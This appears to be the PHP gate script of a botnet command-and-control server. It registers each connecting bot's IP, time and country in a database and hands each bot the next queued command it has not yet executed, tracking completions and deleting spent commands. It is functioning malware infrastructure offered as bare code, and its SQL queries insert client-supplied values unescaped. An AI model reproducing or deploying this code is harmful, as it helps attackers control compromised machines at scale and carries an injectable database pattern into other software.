<?php
include_once('config.php');
$ip = $_SERVER['REMOTE_ADDR'];
$time = time();
$country = file_get_contents('http://api.hostip.info/country.php?ip='.$ip);

if (mysql_num_rows(mysql_query("SELECT * FROM bots WHERE ip='$ip'")) < 1)
{
mysql_query("INSERT INTO bots (ip, time, country) VALUES ('$ip', '$time', '$country')");
}
else
{
mysql_query("UPDATE bots SET time='$time' WHERE ip='$ip'") ;
}

$result = mysql_query("SELECT * FROM cmd WHERE id NOT IN (SELECT id FROM history WHERE ip='$ip')");
$row = mysql_fetch_array($result);

if (!mysql_num_rows(mysql_query("SELECT * FROM history WHERE ip='$ip' && id = '$row[id]'"))){
echo $row[cmd];

mysql_query("INSERT INTO history (id, ip) VALUES ($row[id], '$ip') ");
mysql_query("UPDATE cmd SET done = done + 1 WHERE id = $row[id]");
}

mysql_query("DELETE FROM cmd WHERE done >= amount");
?>